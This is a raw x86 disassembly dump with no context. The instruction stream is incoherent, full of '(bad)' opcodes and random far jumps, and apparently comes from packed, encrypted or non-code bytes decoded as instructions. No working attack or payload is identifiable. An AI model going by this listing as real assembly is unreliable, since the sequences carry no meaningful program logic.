  41de2a:	(bad)  [edx]
  41de2c:	lds    edx,FWORD PTR [edx+0x173ae184]
  41de32:	push   ss
  41de33:	cs xchg esp,eax
  41de35:	cwde   
  41de36:	pop    eax
  41de37:	or     DWORD PTR [ebx],edi
  41de39:	(bad)  
  41de3a:	cmp    ecx,edi
  41de3c:	fadd   st,st(0)
  41de3e:	mov    cl,0x62
  41de40:	outs   dx,DWORD PTR ds:[esi]
  41de41:	sbb    BYTE PTR [ebx-0x56],dh
  41de44:	xor    al,0x35
  41de46:	int    0xce
  41de48:	sahf   
  41de49:	cmp    al,0xce
  41de4b:	js     0x41de72
  41de4d:	xchg   esi,eax
  41de4e:	dec    dx
  41de50:	pop    esi
  41de51:	bound  esp,QWORD PTR [ebx]
  41de53:	dec    ebp
  41de54:	mov    edx,0xeafb1a7
  41de59:	ins    BYTE PTR es:[edi],dx
  41de5a:	retf   0x7523
  41de5d:	(bad)  
  41de5e:	push   eax
  41de5f:	inc    esp
  41de60:	cmp    BYTE PTR [ebp+0x4c2f0cd7],dh
  41de66:	in     al,0xc5
  41de68:	sbb    al,0xbe
  41de6a:	push   ebp
  41de6b:	mov    gs,WORD PTR [eax-0x3034e9c2]
  41de71:	cld    
  41de72:	popa   
  41de73:	ret    
  41de74:	jl     0x41de2e
  41de76:	stc    
  41de77:	adc    BYTE PTR [ebx+0x51],bl
  41de7a:	mov    ebx,edi
  41de7c:	cwde   
  41de7d:	dec    edi
  41de7e:	cli    
  41de7f:	sbb    DWORD PTR [ecx+eiz*1-0x3ca2d1d7],esp
  41de86:	add    DWORD PTR [edi-0x31],edx
  41de89:	mov    ebp,0x27597a77
  41de8e:	or     al,0xb8
  41de90:	mov    al,ds:0xd70ba95a
  41de95:	dec    ebx
  41de96:	or     BYTE PTR [ecx+0xe],0x67
  41de9a:	je     0x41de78
  41de9c:	jp     0x41dee9
  41de9e:	or     ch,ch
  41dea0:	push   cs
  41dea1:	lds    esi,FWORD PTR [ecx]
  41dea3:	pushf  
  41dea4:	pop    eax
  41dea5:	sahf   
  41dea6:	int    0xcb
  41dea8:	xchg   esp,eax
  41dea9:	jle    0x41de8f
  41deab:	and    DWORD PTR [esi+0x2a12879f],ecx
  41deb1:	cmc    
  41deb2:	popf   
  41deb3:	inc    edi
  41deb4:	call   0x233a:0x15756f63
  41debb:	test   al,0x49
  41debd:	xor    al,0x9c
  41debf:	push   ecx
  41dec0:	int3   
  41dec1:	push   eax
  41dec2:	pop    ecx
  41dec3:	sbb    eax,0xd982183b
  41dec8:	ss sbb bl,bl
  41decb:	or     DWORD PTR [ecx],esi
  41decd:	mov    gs,WORD PTR [ecx+0x377ac559]
  41ded3:	jp     0x41df39
  41ded5:	in     eax,dx
  41ded6:	aas    
  41ded7:	pop    ebx
  41ded8:	sbb    al,BYTE PTR [eiz*4-0x223fea04]
  41dedf:	pushf  
  41dee0:	dec    edi
  41dee1:	ja     0x41df4b
  41dee3:	cmp    eax,0x3fd7db1c
  41dee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee9:	pop    edx
  41deea:	aas    
  41deeb:	cmc    
  41deec:	inc    ecx
  41deed:	mov    BYTE PTR [edx],0x89
  41def0:	jno    0x41df63
  41def2:	mov    ebx,0xeacfe41e
  41def7:	cdq    
  41def8:	lods   eax,DWORD PTR ds:[esi]
  41def9:	jle    0x41def7
  41defb:	js     0x41dec1
  41defd:	and    BYTE PTR [edx+ebp*8-0x2f],cl
  41df01:	in     al,0x52
  41df03:	das    
  41df04:	pop    ebp
  41df05:	mov    ah,0xa0
  41df07:	or     BYTE PTR [ebx-0x32],bl
  41df0a:	loope  0x41df33
  41df0c:	ds pop ecx
  41df0e:	push   esi
  41df0f:	ins    BYTE PTR es:[edi],dx
  41df10:	ds popf 
  41df12:	cdq    
  41df13:	popa   
  41df14:	cmp    cl,BYTE PTR [eax-0x76]
  41df17:	xor    ebx,ebp
  41df19:	test   al,0xa1
  41df1b:	ja     0x41df19
  41df1d:	add    DWORD PTR [ebp+0x1],ebx
  41df20:	or     ecx,DWORD PTR fs:[edx-0x12087f8f]
  41df27:	int    0x4a
  41df29:	lea    eax,[edi-0x60]
  41df2c:	mov    cl,0xa7
  41df2e:	loop   0x41dee9
  41df30:	fimul  WORD PTR [edi-0x2f5dcf94]
  41df36:	xchg   ebx,eax
  41df37:	mov    ch,0x9f
  41df39:	sub    ebp,DWORD PTR [ecx]
  41df3b:	jns    0x41ded5
  41df3d:	jo     0x41df1d
  41df3f:	or     ebx,eax
  41df41:	rcr    BYTE PTR [ebx],cl
  41df43:	inc    edi
  41df44:	jecxz  0x41df24
  41df46:	retf   
  41df47:	mov    al,0x39
  41df49:	ret    
  41df4a:	mov    dl,0xfa
  41df4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df4d:	push   ebx
  41df4e:	ja     0x41df65
  41df50:	sti    
  41df51:	idiv   bh
  41df53:	jns    0x41dfc8
  41df55:	jmp    0xf5d9:0x73496663
  41df5c:	jo     0x41dee8
  41df5e:	dec    edx
  41df5f:	xor    bl,BYTE PTR [edx]
  41df61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df62:	into   
  41df63:	(bad)
  41df68:	sub    ch,0x24
  41df6b:	mov    esi,0xa2af75d1
  41df70:	mov    al,0x19
  41df72:	sub    ebx,ecx
  41df74:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41df76:	add    eax,0x92c236b8
  41df7b:	ins    DWORD PTR es:[edi],dx
  41df7c:	cmp    eax,0xbfffded1
  41df81:	je     0x41df86
  41df83:	adc    al,0x80
  41df85:	or     edi,esp
  41df87:	test   eax,0xc9191ef
  41df8c:	and    DWORD PTR [eax],ecx
  41df8e:	inc    esp
  41df8f:	jnp    0x41df67
  41df91:	jmp    0x6235b122
  41df96:	ja     0x41e00f
  41df98:	cld    
  41df99:	cmp    cl,dl
  41df9b:	pop    edx
  41df9c:	inc    ecx
  41df9d:	dec    ecx
  41df9e:	jnp    0x41dfe0
  41dfa0:	dec    edx
  41dfa1:	jp     0x41dfb1
  41dfa3:	xor    DWORD PTR [ecx],esp
  41dfa5:	jo     0x41dfd8
  41dfa7:	mov    ecx,0x5ca0b67d
  41dfac:	jle    0x41df3f
  41dfae:	clc    
  41dfaf:	xchg   ebp,eax
  41dfb0:	xchg   ebp,eax
  41dfb1:	aam    0x97
  41dfb3:	xchg   BYTE PTR [ecx+eax*1-0x5b1c5827],al
  41dfba:	sbb    esp,eax
  41dfbc:	loope  0x41e034
  41dfbe:	mov    edx,0xdd0b3206
  41dfc3:	and    ebx,DWORD PTR [esi]
  41dfc5:	ss in  eax,0x81
  41dfc8:	cmp    DWORD PTR [ebp-0x3d],eax
  41dfcb:	xchg   ecx,eax
  41dfcc:	sub    BYTE PTR [ecx-0x230367e8],bh
  41dfd2:	jp     0x41df7e
  41dfd4:	pop    eax
  41dfd5:	repnz popa 
  41dfd7:	lock daa 
  41dfd9:	pop    eax
  41dfda:	test   BYTE PTR [eax-0x33],ch
  41dfdd:	mov    al,ds:0xad21eb5a
  41dfe2:	and    edi,DWORD PTR [esp+eiz*2+0x534eea7f]
  41dfe9:	mov    esp,0x60b44d6
  41dfee:	sbb    esi,DWORD PTR [esi-0xdd8ee73]
  41dff4:	shr    BYTE PTR [edi+0x51545baa],1
  41dffa:	mov    ebp,0xc01073ee
  41dfff:	ror    BYTE PTR [ecx-0x1612fb42],1
  41e005:	ss and al,cl
  41e008:	mov    ecx,0x7b3970af
  41e00d:	inc    eax
  41e00e:	cmp    al,0xc6
  41e010:	sub    al,0xf2
  41e012:	mov    ebx,DWORD PTR [edi-0x4a2e08c9]
  41e018:	outs   dx,DWORD PTR ds:[esi]
  41e019:	mov    DWORD PTR [edi+0x7f1f2448],eax
  41e01f:	or     BYTE PTR ds:0x311e6108,dl
  41e025:	jmp    0xb45bf461
  41e02a:	jle    0x9a7325c3
  41e030:	inc    esi
  41e031:	or     bl,BYTE PTR [edx+ebp*1]
  41e034:	aad    0xaf
  41e036:	adc    cl,0x91
  41e039:	(bad)  
  41e03a:	(bad)  
  41e03b:	jbe    0x41dfc3
  41e03d:	(bad)  
  41e03e:	xor    bl,BYTE PTR [ebx-0x576c104a]
  41e044:	adc    cl,bh
  41e046:	mov    bh,0x57
  41e048:	test   BYTE PTR [edx-0x126bc134],0xa7
  41e04f:	sub    cl,BYTE PTR [ecx+edx*1]
  41e052:	adc    al,0x64
  41e054:	stos   DWORD PTR es:[edi],eax
  41e055:	xchg   DWORD PTR [ecx-0xa],ebp
  41e058:	fild   WORD PTR [esi+0xa]
  41e05b:	xor    eax,0xf47d7275
  41e060:	lea    eax,[edx]
  41e062:	xor    BYTE PTR [ecx+0x1ac287c],dl
  41e068:	push   eax
  41e069:	mov    dl,0xad
  41e06b:	sub    ebx,DWORD PTR [eax+0x5621645b]
  41e071:	(bad)  
  41e072:	stc    
  41e073:	or     ah,BYTE PTR [esi-0x39]
  41e076:	call   0x979cb1d3
  41e07b:	cmp    eax,0xf86efddf
  41e080:	adc    eax,0x86ace15a
  41e085:	xor    BYTE PTR [ecx],al
  41e087:	enterw 0x36e9,0x64
  41e08c:	fidiv  WORD PTR [edi]
  41e08e:	inc    ecx
  41e08f:	sti    
  41e090:	push   ecx
  41e091:	ficom  DWORD PTR [edx]
  41e093:	sub    BYTE PTR [esi],dl
  41e095:	bound  edx,QWORD PTR [eax+ebp*8]
  41e098:	loopne 0x41e05f
  41e09a:	jg     0x41e0a2
  41e09c:	jae    0x41e072
  41e09e:	sub    DWORD PTR [ebx],esi
  41e0a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0a1:	push   eax
  41e0a2:	pop    ebp
  41e0a3:	adc    eax,0xdd5782b
  41e0a8:	(bad)
  41e0ab:	jne    0x41e0e2
  41e0ad:	cmp    BYTE PTR [ebx+eax*8-0x3f0424ae],al
  41e0b4:	mov    esi,0x691af4e2
  41e0b9:	inc    ebp
  41e0ba:	outs   dx,DWORD PTR ds:[esi]
  41e0bb:	and    ecx,DWORD PTR [eax+0x6e]
  41e0be:	fstp   TBYTE PTR [ebx+esi*8-0x15]
  41e0c2:	add    BYTE PTR [ebx],al
  41e0c4:	addr16 nop
  41e0c6:	lea    edx,[ecx+0x47]
  41e0c9:	repnz and al,BYTE PTR [edx+0x59]
  41e0cd:	std    
  41e0ce:	push   ebx
  41e0cf:	jne    0x41e0de
  41e0d1:	enter  0x1bdd,0x26
  41e0d5:	lods   al,BYTE PTR ds:[esi]
  41e0d6:	push   ecx
  41e0d7:	and    eax,0x759f922f
  41e0dc:	(bad)  
  41e0dd:	sbb    ah,BYTE PTR [ecx+0x570f3a8e]
  41e0e3:	rol    DWORD PTR [ecx-0x6efe4b37],cl
  41e0e9:	gs xchg ebx,eax
  41e0eb:	jp     0x41e0ec
  41e0ed:	jno    0x41e149
  41e0ef:	sbb    BYTE PTR [edx],0xb4
  41e0f2:	jae    0x41e136
  41e0f4:	inc    ebx
  41e0f5:	repnz xlat BYTE PTR ds:[ebx]
  41e0f7:	ins    DWORD PTR es:[edi],dx
  41e0f8:	gs push edx
  41e0fa:	mov    dl,0xfa
  41e0fc:	stc    
  41e0fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0fe:	dec    ecx
  41e0ff:	popf   
  41e100:	popa   
  41e101:	sub    ah,BYTE PTR [eax]
  41e103:	push   ecx
  41e104:	push   esi
  41e105:	in     eax,0x2
  41e107:	pop    ds
  41e108:	js     0x41e185
  41e10a:	aas    
  41e10b:	xchg   edi,eax
  41e10c:	frstor [edi-0x7722597e]
  41e112:	sbb    BYTE PTR [edx+0x47],ch
  41e115:	mov    ds:0x2bd06b75,eax
  41e11a:	mov    ds:0xba30c2b6,al
  41e11f:	adc    BYTE PTR [eax+0x3c],0xe1
  41e123:	test   BYTE PTR [esp+edi*2+0x580e481f],0x7
  41e12b:	mov    esp,0x1be9713
  41e130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e131:	stos   DWORD PTR es:[edi],eax
  41e132:	cmp    BYTE PTR [edi-0x33b1b89b],al
  41e138:	jecxz  0x41e0c5
  41e13a:	ins    BYTE PTR es:[edi],dx
  41e13b:	out    dx,eax
  41e13c:	jge    0x41e0e0
  41e13e:	adc    DWORD PTR [edi+0x40],esp
  41e141:	xchg   esi,eax
  41e142:	xchg   ebx,eax
  41e143:	(bad)  
  41e144:	xchg   edi,eax
  41e145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e146:	fcomp  DWORD PTR [edx-0x60a004bb]
  41e14c:	cmp    eax,0x532ae65e
  41e151:	bsr    edi,DWORD PTR [ebp+0x5e]
  41e155:	das    
  41e156:	clc    
  41e157:	xor    al,0x0
  41e159:	pop    esp
  41e15a:	adc    al,BYTE PTR [ecx]
  41e15c:	mov    ds,edx
  41e15e:	push   edi
  41e15f:	push   cs
  41e160:	push   es
  41e161:	addr16 pop eax
  41e163:	aas    
  41e164:	adc    al,0x3b
  41e166:	mov    eax,ds:0xa12f5fa8
  41e16b:	outs   dx,BYTE PTR ds:[esi]
  41e16c:	xor    BYTE PTR fs:[edi+0x33bd73db],bh
  41e173:	xchg   esi,eax
  41e174:	std    
  41e175:	xchg   BYTE PTR [edx],dh
  41e177:	dec    ebp
  41e178:	(bad)  
  41e17a:	jecxz  0x41e177
  41e17c:	out    0xda,al
  41e17e:	xor    DWORD PTR [eax-0x8],esp
  41e181:	call   0x2a42a07e
  41e186:	sub    BYTE PTR [edi+0x3be55b66],0xe0
  41e18d:	push   sp
  41e18f:	push   esi
  41e190:	pusha  
  41e191:	xchg   edi,eax
  41e192:	push   esp
  41e193:	aas    
  41e194:	dec    ecx
  41e195:	push   ebp
  41e196:	push   edi
  41e197:	sbb    DWORD PTR [edi],esi
  41e199:	sub    eax,0x8243ae22
  41e19e:	loopne 0x41e1df
  41e1a0:	jmp    0x1d8284ee
  41e1a5:	aaa    
  41e1a6:	sub    BYTE PTR [eax+0x3baf0c92],0x80
  41e1ad:	ror    bh,cl
  41e1af:	push   esi
  41e1b0:	mov    esp,0x4aeb6964
  41e1b5:	and    al,al
  41e1b7:	or     DWORD PTR [edx+esi*2-0x3e],ebx
  41e1bb:	mov    bl,BYTE PTR [esp+eax*1]
  41e1be:	mov    bl,0x7c
  41e1c0:	aaa    
  41e1c1:	sub    BYTE PTR [edi+eiz*8],dh
  41e1c4:	int    0x79
  41e1c6:	hlt    
  41e1c7:	mov    ebx,0x4fbffd1b
  41e1cc:	mov    dl,0x11
  41e1ce:	imul   ebx,DWORD PTR [ebp+0x35],0xffffff82
  41e1d2:	jp     0x41e1e3
  41e1d4:	sub    eax,0xcc1d23d5
  41e1d9:	ret    
  41e1da:	stos   BYTE PTR es:[edi],al
  41e1db:	loop   0x41e184
  41e1dd:	mov    ah,0xc6
  41e1df:	shl    DWORD PTR [esp+ecx*1-0x71144e01],1
  41e1e6:	and    esi,DWORD PTR [ebp+0x6e4b1fe6]
  41e1ec:	and    ch,BYTE PTR fs:[ecx-0x630d3837]
  41e1f3:	call   0x7516:0x15ad6942
  41e1fa:	sbb    BYTE PTR [esi-0x79],al
  41e1fd:	loopne 0x41e1d0
  41e1ff:	xor    eax,DWORD PTR [eax+edi*1+0x49fc4f9e]
  41e206:	dec    edi
  41e207:	sbb    eax,0x4f7c78
  41e20c:	test   DWORD PTR [ecx-0x53],0xc2279f03
  41e213:	jecxz  0x41e250
  41e215:	pop    ds
  41e216:	dec    BYTE PTR [ebx+0x4f]
  41e219:	je     0x41e1fc
  41e21b:	mov    eax,ds:0xa8439e25
  41e220:	pop    esi
  41e221:	sub    eax,0x7bb1a229
  41e226:	aam    0xc2
  41e228:	mov    eax,ds:0xcc6b9cc
  41e22d:	repnz bound eax,QWORD PTR [edi+0x42]
  41e231:	shl    DWORD PTR [eax-0x7b],0x3
  41e235:	stc    
  41e236:	push   esi
  41e237:	cld    
  41e238:	mov    esp,0x94c22ce0
  41e23d:	dec    esp
  41e23e:	and    esi,DWORD PTR [ebp-0x4b513788]
  41e244:	push   0xfffffff3
  41e246:	mov    bh,0x83
  41e248:	in     eax,0x9f
  41e24a:	(bad)  
  41e24b:	cdq    
  41e24c:	pushf  
  41e24d:	ret    
  41e24e:	xchg   BYTE PTR [edi],ch
  41e250:	pop    es
  41e251:	jge    0x41e1f5
  41e253:	les    edi,FWORD PTR [edi]
  41e255:	mov    edx,0xf8149ae
  41e25a:	(bad)  
  41e25b:	inc    esi
  41e25c:	sub    eax,DWORD PTR [ecx-0x15]
  41e25f:	fxch   st(5)
  41e261:	(bad)
  41e265:	nop
  41e266:	and    BYTE PTR [ecx+0x642bcb5a],0xc1
  41e26d:	xchg   DWORD PTR [ecx],ebx
  41e26f:	outs   dx,DWORD PTR ds:[esi]
  41e270:	xchg   esp,eax
  41e271:	enter  0xdfd6,0x75
  41e275:	push   edi
  41e276:	stos   BYTE PTR es:[edi],al
  41e277:	lahf   
  41e278:	dec    edi
  41e279:	out    dx,eax
  41e27a:	push   edi
  41e27b:	fimul  DWORD PTR [eax-0x2]
  41e27e:	push   ss
  41e27f:	pop    ebp
  41e280:	mov    ebp,0x78b0d49
  41e285:	sar    BYTE PTR [edi+0x7aa4a3b6],cl
  41e28b:	stos   DWORD PTR es:[edi],eax
  41e28c:	add    DWORD PTR [edx-0x52a3e77e],esp
  41e292:	jb     0x41e257
  41e294:	push   ecx
  41e295:	mov    edi,0x67e8d49f
  41e29a:	pop    esp
  41e29b:	daa    
  41e29c:	jmp    0x5a32b0ab
  41e2a1:	outs   dx,BYTE PTR ds:[esi]
  41e2a2:	std    
  41e2a3:	mov    ebp,0xa9c4c0e7
  41e2a8:	(bad)  
  41e2a9:	sti    
  41e2aa:	loop   0x41e2cd
  41e2ac:	stos   DWORD PTR es:[edi],eax
  41e2ad:	fsub   QWORD PTR [edx+edi*1+0x5b533f86]
  41e2b4:	dec    edx
  41e2b5:	dec    edx
  41e2b6:	push   edi
  41e2b7:	push   0x20
  41e2b9:	cmp    al,0x6b
  41e2bb:	(bad)  
  41e2bc:	in     eax,dx
  41e2bd:	(bad)  
  41e2be:	retf   
  41e2bf:	or     bl,BYTE PTR [ebp+ecx*1-0x1e]
  41e2c3:	push   es
  41e2c4:	aas    
  41e2c5:	(bad)
  41e2c8:	js     0x41e253
  41e2ca:	cmovb  edi,DWORD PTR [ebp+esi*8-0x37]
  41e2cf:	xor    DWORD PTR [esi+ecx*8],edx
  41e2d2:	enter  0xdcbf,0x80
  41e2d6:	lahf   
  41e2d7:	mov    ah,BYTE PTR [ebx]
  41e2d9:	mov    esi,0x99c1b9b8
  41e2de:	ret    0x372d
  41e2e1:	adc    edx,DWORD PTR [eax-0x13]
  41e2e4:	into   
  41e2e5:	mov    edi,0x21f1d74f
  41e2ea:	mov    edx,0x5d1f7c5
  41e2ef:	dec    esi
  41e2f0:	push   ds
  41e2f1:	sub    al,0xfb
  41e2f3:	push   cs
  41e2f4:	add    ecx,esi
  41e2f6:	dec    ebx
  41e2f7:	jns    0x41e314
  41e2f9:	and    ch,BYTE PTR [esp+edi*8+0x423f7ec1]
  41e300:	xchg   esp,eax
  41e301:	imul   esi,ebp,0xfc3d20c2
  41e307:	(bad)  
  41e308:	or     eax,0x89e2d71a
  41e30d:	pop    ss
  41e30e:	pop    esi
  41e30f:	loopne 0x41e2fc
  41e311:	pop    eax
  41e312:	das    
  41e313:	mov    edx,0x4f41098d
  41e318:	scas   al,BYTE PTR es:[edi]
  41e319:	xchg   edi,eax
  41e31a:	and    BYTE PTR [ecx],0x4d
  41e31d:	cs inc edi
  41e31f:	jecxz  0x41e376
  41e321:	mov    eax,ds:0x26b09b67
  41e326:	shl    cl,cl
  41e328:	ins    BYTE PTR es:[edi],dx
  41e329:	mov    al,BYTE PTR [ebx]
  41e32b:	fiadd  DWORD PTR [esi+eiz*2-0x3d]
  41e32f:	in     eax,0x2
  41e331:	cs dec edx
  41e333:	ror    BYTE PTR [ebx],cl
  41e335:	repnz cmp eax,0xa877b63c
  41e33b:	(bad)  
  41e33c:	mov    esp,0x4121a4ba
  41e341:	jmp    0x97cc:0xc65a42f
  41e348:	adc    ebp,edx
  41e34a:	and    bl,cl
  41e34c:	jmp    0xcc31fbde
  41e351:	fs cmp dl,ch
  41e354:	sub    BYTE PTR [edi+0x2],al
  41e357:	lahf   
  41e358:	rcl    BYTE PTR [esi-0x298fce0],0x62
  41e35f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e360:	fnstcw WORD PTR [ebp+0x678d2629]
  41e366:	fnstenv [ebp-0x50]
  41e369:	(bad)  
  41e36a:	es jo  0x41e3dc
  41e36d:	jne    0x41e2fe
  41e36f:	popa   
  41e370:	pusha  
  41e371:	xchg   ebp,eax
  41e372:	aas    
  41e373:	fs mov esp,0x3ca8431e
  41e379:	sbb    al,0x93
  41e37b:	das    
  41e37c:	xchg   esi,eax
  41e37d:	mov    esi,0x98cab228
  41e382:	mov    al,ds:0xf7be1181
  41e387:	inc    esp
  41e388:	xlat   BYTE PTR ds:[ebx]
  41e389:	ret    0x81d5
  41e38c:	arpl   dx,ax
  41e38e:	sbb    ecx,ecx
  41e390:	jle    0x41e369
  41e392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e393:	pop    es
  41e394:	mov    esi,0x1044cd48
  41e399:	clc    
  41e39a:	popfw  
  41e39c:	xchg   edi,eax
  41e39d:	or     al,0x59
  41e39f:	jae    0x41e35f
  41e3a1:	mov    ch,0x5a
  41e3a3:	jg     0x41e39b
  41e3a5:	pop    edi
  41e3a6:	push   0x33fe5aea
  41e3ab:	jbe    0x41e33f
  41e3ad:	inc    ebp
  41e3ae:	ins    BYTE PTR es:[edi],dx
  41e3af:	jg     0x41e401
  41e3b1:	add    BYTE PTR [esi-0x46],dl
  41e3b4:	retf   0x93dd
  41e3b7:	lahf   
  41e3b8:	and    eax,ebp
  41e3ba:	in     eax,dx
  41e3bb:	add    bh,BYTE PTR [eax+0xc]
  41e3be:	iret   
  41e3bf:	cmp    ch,dl
  41e3c1:	retf   0xa03d
  41e3c4:	aas    
  41e3c5:	imul   ebp,esp,0x9e81d9ea
  41e3cb:	push   ds
  41e3cc:	mov    edx,0xdf4e307e
  41e3d1:	xchg   esi,eax
  41e3d2:	hlt    
  41e3d3:	es loop 0x41e438
  41e3d6:	out    dx,al
  41e3d7:	mov    ebp,fs
  41e3d9:	add    al,0xd
  41e3db:	inc    eax
  41e3dc:	ficomp DWORD PTR [ebx+0x22]
  41e3df:	fst    DWORD PTR [edi-0x1c]
  41e3e2:	and    edx,esp
  41e3e4:	imul   ebp,DWORD PTR es:[edx-0x6b],0xf1378ccb
  41e3ec:	les    esp,FWORD PTR cs:[esi-0x75]
  41e3f0:	jge    0x41e389
  41e3f2:	add    bl,bl
  41e3f4:	dec    ebp
  41e3f5:	mov    cl,BYTE PTR [ebp+eax*4+0x60d46d3a]
  41e3fc:	cs xor ebx,edi
  41e3ff:	sub    eax,0x2b11fc03
  41e404:	xor    bl,0x95
  41e407:	mov    ebp,0x1560aaef
  41e40c:	xor    BYTE PTR [ecx+0x676a102e],0xcc
  41e413:	adc    eax,0x6bb0b76c
  41e418:	je     0x41e41c
  41e41a:	clc    
  41e41b:	test   BYTE PTR [edx+ecx*8],dh
  41e41e:	dec    ebp
  41e41f:	rol    edi,1
  41e421:	imul   BYTE PTR [esi+0x40502d7c]
  41e427:	lods   eax,DWORD PTR ds:[esi]
  41e428:	fld    DWORD PTR [eax-0x49]
  41e42b:	cmp    ah,BYTE PTR [edx+0x31]
  41e42e:	inc    edi
  41e42f:	out    dx,al
  41e430:	mov    edi,DWORD PTR [edi+0x3e9535b9]
  41e436:	push   esi
  41e437:	add    eax,0xd94d470e
  41e43c:	jae    0x41e44d
  41e43e:	push   cs
  41e43f:	rcl    BYTE PTR [edx-0x302e7913],1
  41e445:	out    0xf3,eax
  41e447:	adc    ebx,eax
  41e449:	dec    edx
  41e44a:	in     al,0xa9
  41e44c:	jne    0x41e47c
  41e44e:	sbb    DWORD PTR [ecx],ebx
  41e450:	mov    edi,0xb0483226
  41e455:	push   cs
  41e456:	pop    edx
  41e457:	xor    eax,0x437acb17
  41e45c:	push   ebp
  41e45d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e45e:	cwde   
  41e45f:	clc    
  41e460:	pusha  
  41e461:	ins    BYTE PTR es:[edi],dx
  41e462:	mov    al,0x3
  41e464:	fdivr  QWORD PTR [edx-0x7591c781]
  41e46a:	mov    esp,0xe00f5c03
  41e46f:	call   0xca0:0x25c09ff6
  41e476:	xor    DWORD PTR [esi+0x16],0xfffffff4
  41e47a:	dec    edi
  41e47b:	(bad)  
  41e47c:	cmc    
  41e47d:	out    dx,eax
  41e47e:	mov    edi,0xdaa67e57
  41e483:	dec    ecx
  41e484:	pop    edx
  41e485:	xchg   ebp,eax
  41e486:	add    BYTE PTR [esi-0x6c1f1b38],bl
  41e48c:	mov    ecx,0x1d3c008c
  41e491:	or     dh,BYTE PTR [ecx+0x72]
  41e494:	(bad)  
  41e496:	les    ebp,FWORD PTR [eax+0x44]
  41e499:	xchg   ebp,eax
  41e49a:	arpl   WORD PTR [eax-0x5c],si
  41e49d:	pushf  
  41e49e:	mov    esp,0xece82573
  41e4a3:	jae    0x41e524
  41e4a5:	xchg   edx,eax
  41e4a6:	lea    ebx,[ecx]
  41e4a8:	push   edx
  41e4a9:	mov    ecx,0x25e45c7f
  41e4ae:	mov    esp,0x3a56f42b
  41e4b3:	xor    DWORD PTR [ebp-0x39e3f086],edi
  41e4b9:	sub    edx,DWORD PTR [ecx]
  41e4bb:	push   ds
  41e4bc:	psubusw mm6,QWORD PTR [esi]
  41e4bf:	stc    
  41e4c0:	mov    edx,0x408a5e6a
  41e4c5:	xchg   esp,eax
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	pusha  
  41e4c8:	jecxz  0x41e501
  41e4ca:	ins    BYTE PTR es:[edi],dx
  41e4cb:	lods   al,BYTE PTR ss:[esi]
  41e4cd:	frstor [eax+esi*2-0x1b]
  41e4d1:	ds stos BYTE PTR es:[edi],al
  41e4d3:	or     eax,0x8f1d1e09
  41e4d8:	dec    edi
  41e4d9:	ja     0x41e51c
  41e4db:	mov    ds:0xcf72a609,al
  41e4e0:	mov    al,0xa3
  41e4e2:	jno    0x41e536
  41e4e4:	call   0xd930ae4d
  41e4e9:	in     al,0x9b
  41e4eb:	adc    ecx,DWORD PTR [ecx+0x65]
  41e4ee:	retf   0x8f59
  41e4f1:	fxtract 
  41e4f3:	in     eax,dx
  41e4f4:	mov    dl,0x52
  41e4f6:	push   ebp
  41e4f7:	mov    ds:0xd0f55b45,eax
  41e4fc:	xchg   esp,eax
  41e4fd:	adc    DWORD PTR ds:0xd04463b4,ecx
  41e503:	push   edx
  41e504:	fidiv  DWORD PTR [ebp-0x11ddae82]
  41e50a:	jg     0x41e4f4
  41e50c:	icebp  
  41e50d:	(bad)  
  41e50e:	sti    
  41e50f:	div    BYTE PTR [esi+0x15b05658]
  41e515:	loop   0x41e577
  41e517:	push   0xa809c34d
  41e51c:	mov    ah,0x1f
  41e51e:	test   DWORD PTR [ebx+0x1ad11b81],edi
  41e524:	es ret 0x2558
  41e528:	fwait
  41e529:	push   edi
  41e52a:	dec    esp
  41e52b:	or     eax,DWORD PTR [eax]
  41e52d:	push   ss
  41e52e:	(bad)
  41e532:	mov    BYTE PTR [esi],bh
  41e534:	loope  0x41e557
  41e536:	aaa    
  41e537:	daa    
  41e538:	repnz add eax,0x697cfb1b
  41e53e:	jno    0x41e55f
  41e540:	jo     0x41e535
  41e542:	and    BYTE PTR [ecx+0x4],al
  41e545:	mov    bl,BYTE PTR [edi-0x43]
  41e548:	or     ebp,ebx
  41e54a:	arpl   WORD PTR [edi+0x17],si
  41e54d:	and    BYTE PTR [esi+ebx*4],cl
  41e550:	mov    ch,0x86
  41e552:	push   0x16
  41e554:	fimul  WORD PTR [ecx+0x6a]
  41e557:	pusha  
  41e558:	aas    
  41e559:	dec    ebx
  41e55a:	pop    ss
  41e55b:	test   BYTE PTR ds:0x2291f23d,ah
  41e561:	add    bh,BYTE PTR [ecx]
  41e563:	js     0x41e5b5
  41e565:	inc    ebp
  41e566:	mov    cl,0x21
  41e568:	jl     0x41e554
  41e56a:	or     BYTE PTR [edx],dh
  41e56c:	retf   
  41e56d:	inc    ecx
  41e56e:	mov    al,BYTE PTR [edi+0x80671c9]
  41e574:	sub    ah,ch
  41e576:	add    ebp,DWORD PTR [esi-0x40]
  41e579:	lock (bad) 
  41e57b:	(bad)  
  41e57c:	sbb    eax,0x8a9de46d
  41e581:	inc    edi
  41e582:	mov    ?,WORD PTR [edx+0x1c497356]
  41e588:	sbb    al,0x54
  41e58a:	adc    esi,eax
  41e58c:	dec    esi
  41e58d:	fldcw  WORD PTR [edi-0x136bf1c3]
  41e593:	xchg   ebx,eax
  41e594:	pop    esp
  41e595:	mov    bl,0xd5
  41e597:	adc    esi,DWORD PTR [ecx+0x40]
  41e59a:	add    edx,DWORD PTR [ebp-0x6]
  41e59d:	push   esp
  41e59e:	cwde   
  41e59f:	sub    eax,0xf5190b6e
  41e5a4:	add    dh,BYTE PTR [eax+ecx*1-0x307365be]
  41e5ab:	je     0x41e57c
  41e5ad:	dec    ecx
  41e5ae:	pextrw ebx,mm5,0x7f
  41e5b2:	pop    eax
  41e5b3:	fsub   DWORD PTR [edx]
  41e5b5:	mov    ch,0x5d
  41e5b7:	ror    DWORD PTR [edx+edx*2+0x7f],1
  41e5bb:	add    DWORD PTR [edi+0x21],edx
